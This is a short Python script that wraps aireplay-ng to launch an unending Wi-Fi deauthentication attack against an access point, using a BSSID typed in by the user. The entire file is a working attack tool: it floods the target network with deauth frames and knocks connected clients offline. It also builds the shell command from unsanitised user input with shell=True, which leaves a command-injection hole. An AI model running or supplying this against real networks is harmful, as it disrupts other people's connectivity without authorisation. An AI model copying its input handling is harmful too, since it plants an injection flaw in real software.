import subprocess

def get_bssid():
    return input("Enter the BSSID for deauthentication (e.g., 84:90:0A:DE:20:DF): ")

def run_aireplay(bssid):
    try:
        # Construct the command with the provided BSSID
        command = f"sudo aireplay-ng --deauth 0 -a {bssid} wlan0mon"
        
        # Print the constructed command for verification
        print(f"Running aireplay-ng command: {command}")

        # Run the command in a shell and display output in real-time
        process = subprocess.Popen(command, shell=True, text=True)
        
        # Wait for the process to complete
        try:
            process.wait()
        except KeyboardInterrupt:
            print("\nInterrupted by user.")
            process.terminate()
            process.wait()
            print("Aireplay-ng process terminated.")

    except subprocess.CalledProcessError as e:
        print(f"Failed to run aireplay-ng with BSSID {bssid}: {e}")

# Example usage
if __name__ == "__main__":
    bssid = get_bssid()
    run_aireplay(bssid)